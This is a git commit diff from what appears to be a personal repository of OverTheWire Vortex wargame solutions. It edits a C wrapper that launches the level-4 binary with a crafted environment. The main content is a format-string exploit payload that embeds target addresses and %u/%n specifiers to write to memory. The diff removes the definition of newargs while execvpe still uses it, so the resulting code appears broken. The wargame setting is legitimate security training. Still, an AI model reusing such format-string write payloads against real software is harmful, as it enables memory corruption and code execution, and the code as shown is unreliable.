c6ee3c9f11fa834c9bc045d365096396048a5e10
bmoar <ben@rooted.systems>
2016-02-14 15:57:06 -0500

    rm junk

--- otw/vortex/5/exec_wrapper.c
+++ otw/vortex/5/exec_wrapper.c
@@ -7,14 +7,10 @@
 
 #include <debug.h>
 
-char *newargs[] = { NULL };
-
-char payload_buff[16777216];
-
 char *newenv[] = { 
     "CCCC", 
     "BBBB", 
-    "\x14\xa0\x04\x08||||\x15\xa0\x04\x08\x16\xa0\x04\x08\x17\xa0\x04\x08%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u.%u.%u%u%u%u%u%u%u%u.............%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u.%71u%n%208u%n%n%n\x00\x00", 
+    "\x14\xa0\x04\x08||||\x15\xa0\x04\x08||||\x16\xa0\x04\x08\x17\xa0\x04\x08%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u.%u.%u%u%u%u%u%u%u%u....%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u.%71u%n%208u%n%203u%n%n\x00\x00", 
     "\x14\xa0\x04\x08", 
 };
 
@@ -22,17 +18,6 @@ int main(int argc, char *argv[]) {
     int fd = 0;
     int rc = 0;
 
-    // check(argc == 2, "wrong number of args");
-
-    // fd = open(argv[1], 'r');
-    // check(fd, "could not open file");
-
-    // rc = read(fd, payload_buff, sizeof(payload_buff));
-    // check(rc, "could not read file %d", rc);
-
-    // close(fd);
-
-    // newenv[2] = payload_buff;
     rc = execvpe("/home/bmoar/git/hacking/otw/vortex/5/vortex4", newargs, newenv);
     check(rc != -1, "should not have failed to execvpe with newenv[2]");
 
